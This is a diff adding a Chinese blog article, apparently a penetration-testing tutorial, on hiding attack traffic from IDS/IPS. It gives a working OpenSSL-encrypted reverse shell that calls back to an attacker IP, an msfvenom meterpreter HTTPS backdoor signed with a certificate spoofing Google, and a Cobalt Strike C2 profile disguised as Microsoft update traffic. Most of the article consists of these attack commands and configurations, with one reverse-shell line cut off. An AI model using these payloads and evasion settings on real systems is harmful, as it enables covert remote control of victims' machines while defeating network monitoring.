@@ -458,21 +458,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-05
+                    2022-04-13
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    2.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    9 分
                 </div>
                 
 
@@ -490,7 +490,203 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>​        渗透测试的后期，为了横向渗透，需要反弹shell，如果反弹shell都是明文传输，内网如果有IDS或者防护软件会进行流量分析。如果能够回溯分析，就可以复现整个过程。会通过wireshark抓包直接看到输入的命令和返回的信息，有些危险命令会被防火墙或者ips检测并拦截</p>
+<h4 id="IPS和IDS"><a href="#IPS和IDS" class="headerlink" title="IPS和IDS"></a>IPS和IDS</h4><blockquote>
+<p><strong>IDS入侵检测（旁路部署）</strong></p>
+<p>假如防火墙是一幢大厦的门锁，那么IDS就是这幢大厦里的监视系统。一旦小偷进入了大厦，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。与防火墙不同的是，IDS入侵检测系统是一个旁路监听设备，没有也不需要跨接在任何链路上，无须网络流量流经它便可以工作。因此，对IDS的部署的唯一要求是：IDS应当挂接在所有所关注的流量都必须流经的链路上。在这里，“所关注流量”指的是来自高危网络区域的访问流量和需要进行统计、监视的网络报文。</p>
+<p>IDS在交换式网络中的位置一般选择为：尽可能靠近攻击源、尽可能靠近受保护资源。</p>
+<p>这些位置通常是：<br>1、服务器区域的交换机上；<br>2、Internet接入路由器之后的第一台交换机上；<br>3、重点保护网段的局域网交换机上</p>
+<p><strong>IPS入侵防御（串行部署）</strong></p>
+<p>IPS系统是电脑网络安全设施，是对防病毒软件和防火墙的补充。 IPS系统是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p>
+<p>对于部署在数据转发路径上的IPS，可以根据预先设定的安全策略，对流经的每个报文进行深度检测（协议分析跟踪、特征匹配、流量统计分析、事件关联分析等），如果一旦发现隐藏于其中网络攻击，可以根据该攻击的威胁级别立即采取抵御措施，这些措施包括（按照处理力度）：向管理中心告警；丢弃该报文；切断此次应用会话；切断此次TCP连接。</p>
+<p>办公网中，需要在以下区域部署IPS：</p>
+<p>1、办公网与外部网络的连接部位（入口/出口）；</p>
+<p>2、重要服务器集群前端；</p>
+<p>3、办公网内部接入层。</p>
+<p>4、至于其它区域，可以根据实际情况与重要程度，酌情部署。</p>
+</blockquote>
+<h4 id="IPS与IDS的区别"><a href="#IPS与IDS的区别" class="headerlink" title="IPS与IDS的区别"></a>IPS与IDS的区别</h4><ol>
+<li><p>IPS对于初始者来说，是位于防火墙和网络的设备之间的设备。这样，如果检测到攻击，IPS会在这种攻击扩散到网络的其它地方之前阻止这个恶意的通信。而IDS只是存在于你的网络之外起到报警的作用，而不是在你的网络前面起到防御的作用。</p>
+</li>
+<li><p>IPS具有检测已知和未知攻击并具有成功防止攻击的能力而IDS没有</p>
+</li>
+<li><p>IDS的局限性是不能反击网络攻击，因为IDS传感器基于数据包嗅探技术，只能眼睁睁地看着网络信息流过。IPS可执行IDS相同的分析，因为他们可以插入网内，装在网络组件之间，而且他们可以阻止恶意活动</p>
+</li>
+<li><p>在kali上生成SSL证书的公钥/私钥对</p>
+</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>其中各参数：</p>
+<p>-new: 表示生成一个新的证书签署要求<br>-x509： 专用于生成CA自签证书<br>-key：指定生成证书用到的私钥文件<br>-out FILNAME：指定生成的证书的保存路径<br>-days：指定证书的有效期限，单位为day，默认是365天<br>-notes： 生成的私钥文件不会被加密</p>
+</blockquote>
+<ol start="2">
+<li>在kali上监听81端口</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">openssl s_server -quiet -key key.pem -cert cert.pem -port 81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol start="3">
+<li>在目标机器上用openssl反弹加密shell</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.80.137:81 &gt; /t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p><code>mkfifo /tmp/s;</code>：创建一个管道</p>
+<p><code>/bin/sh -i &lt; /tmp/s 2&gt;&amp;1</code> 打开一个交互式反弹shell，<code>2&gt;&amp;1</code>的意思是把标准错误输出重定向到标准输出，否则输入错误命令回显会显示在靶机中</p>
+<p><code>openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s;</code> 解密流量，将攻击端输入的数据解密后反弹回攻击端</p>
+<p><code>rm /tmp/s</code> 由于已经加载进内存，清除掉<code>/tmp/s</code>文件</p>
+<p>其中openssl各参数：</p>
+<p><code>-quiet</code>：不打印出session和证书的信息。同时隐式打开-ign_eof<br><code>-ign_eof</code>：当输入文件到达文件尾的时候并不断开连接<br><code>-connect host:port</code>： 设置服务器地址和端口号。如果没有设置，则默认为本地主机以及端口号4433</p>
+</blockquote>
+<h2 id="MSF流量加密躲避检测"><a href="#MSF流量加密躲避检测" class="headerlink" title="MSF流量加密躲避检测"></a>MSF流量加密躲避检测</h2><p><strong>OpenSSL创建SSL/TLS证书</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
+-subj "/C=UK/ST=London/L=London/O=Development/CN=www.google.com" \
+-keyout www.google.com.key \
+-out www.google.com.crt &amp;&amp; \
+cat www.google.com.key www.google.com.crt &gt; www.google.com.pem &amp;&amp; \
+rm -f www.google.com.key www.google.com.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>生成后门</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_winhttps LHOST=***.***.***.* LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o pentestlab.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>设置监听器</strong></p>
+<p>配置侦听器时还需要使用两个附加选项。这是为了通知处理程序它将使用的证书（与有效负载相同），并在接收到连接时执行SSL证书验证。</p>
+<pre class="line-numbers language-none"><code class="language-none">HandlerSSLCert 
+StagerVerifySSLCert 
+set payload windows/meterpreter/reverse_winhttps
+set LHOST ***.***.***.*
+set LPORT 443
+set HandlerSSLCert /home/kali/msf/www.google.com.pem 
+set StagerVerifySSLCert true
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="流量加密（一）/image-20220413104309924.png">
+
+<h2 id="CS生成SSL证书修改C2-profile流量加密混淆"><a href="#CS生成SSL证书修改C2-profile流量加密混淆" class="headerlink" title="CS生成SSL证书修改C2 profile流量加密混淆"></a>CS生成SSL证书修改C2 profile流量加密混淆</h2><p>Cobalt Strike默认使用的cobaltStrike.store证书，默认证书已经被各种IDS入侵检测工具和流量检测工具拦截和发现</p>
+<p><strong>keytool工具介绍</strong></p>
+<p>Keytool是一个Java数据证书的管理工具,Keytool将密钥（key）和证书（certificates）存在一个称为keystore的文件中,即store后缀文件中。</p>
+<pre class="line-numbers language-none"><code class="language-none">选项:
+
+-alias &lt;alias&gt;         要处理的条目的别名
+-keyalg &lt;alg&gt;           密钥算法名称
+-keysize &lt;size&gt;         密钥位大小
+-groupname &lt;name&gt;       Group name. For example, an Elliptic Curve name.
+-sigalg &lt;alg&gt;           签名算法名称
+-destalias &lt;alias&gt;     目标别名
+-dname &lt;name&gt;           唯一判别名
+-startdate &lt;date&gt;       证书有效期开始日期/时间
+-ext &lt;value&gt;           X.509 扩展
+-validity &lt;days&gt;       有效天数
+-keypass &lt;arg&gt;         密钥口令
+-keystore &lt;keystore&gt;   密钥库名称
+-storepass &lt;arg&gt;       密钥库口令
+-storetype &lt;type&gt;       密钥库类型
+-providername &lt;name&gt;   提供方名称
+-addprovider &lt;name&gt;     按名称 (例如 SunPKCS11) 添加安全提供方
+  [-providerarg &lt;arg&gt;]   配置 -addprovider 的参数
+-providerclass &lt;class&gt; 按全限定类名添加安全提供方
+  [-providerarg &lt;arg&gt;]   配置 -providerclass 的参数
+-providerpath &lt;list&gt;   提供方类路径
+-v                     详细输出
+-protected             通过受保护的机制的口令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>生成SSL证书命令</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">keytool -genkey -alias yyy -keyalg RSA -validity 36500 -keystore haha
+yyy haha这两个字符串要记住，后续修改profile需要使用
+密钥库口令：123456
+组织名称：MicrosoftUpdates（尽量像大型企业）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>创建并修改C2-profile文件</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">set sample_name "moonsec POS Malware";
+set sleeptime "5000"; # use a ~30s delay between callbacks
+set jitter "10"; # throw in a 10% jitter
+set useragent "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101
+Firefox/24.0";
+#设置证书
+https-certificate {
+set CN "US";
+set O "MicrosoftUpdates";
+set C "en";
+set L "US";
+set OU "MicrosoftUpdates";
+set ST "US";
+set validity "365";
+}#设置
+code-signer{
+set keystore "haha";
+set password "123456";
+set alias "yyy";
+}#指定 DNS beacon 不用的时候指定到 IP 地址
+set dns_idle "8.8.4.4";
+#每个单独 DNS 请求前强制睡眠时间
+set dns_sleep "0";
+#通过 DNS 上载数据时主机名的最大长度[0-255]
+set maxdns "235";
+http-post {
+set uri "/windebug/updcheck.php /aircanada/dark.php /aero2/fly.php
+/windowsxp/updcheck.php /hello/flash.php";
+client {
+header "Accept" "text/plain";
+header "Accept-Language" "en-us";
+header "Accept-Encoding" "text/plain";
+header "Content-Type" "application/x-www-form-urlencoded";
+id {
+netbios;
+parameter "id";
+}
+output {
+base64;
+prepend "&amp;op=1&amp;id=vxeykS&amp;ui=Josh @
+PC&amp;wv=11&amp;gr=backoff&amp;bv=1.55&amp;data=";
+print;
+} }
+server {
+output {
+print;
+} } }
+http-get {
+set uri "/updates";
+client {
+metadata {
+netbiosu;
+prepend "user=";
+header "Cookie";
+} }
+server {
+header "Content-Type" "text/plain";
+output {
+base64;
+print;
+} } }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>注意设置这两个地方</p>
+<pre class="line-numbers language-none"><code class="language-none">#设置证书
+https-certificate {
+set CN "US";
+set O "MicrosoftUpdates";
+set C "en";
+set L "US";
+set OU "MicrosoftUpdates";
+set ST "US";
+set validity "365";
+}#设置
+code-signer{
+set keystore "haha";
+set password "123456";
+set alias "yyy";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>c2link检测c2 profile文件是否可用</p>
+<pre class="line-numbers language-none"><code class="language-none">./c2link wkk.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>运行失败会有红色信息</p>
+<p><strong>配置teamserver文件运行上线</strong></p>
+<p>修改默认端口，50050过于明显</p>
+<img src="流量加密（一）/20210315172931553.png">
+
+<p><img src="/%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20220413110526683.png"></p>
+<p>即可使用</p>
+
                 
             </div>
             <hr/>
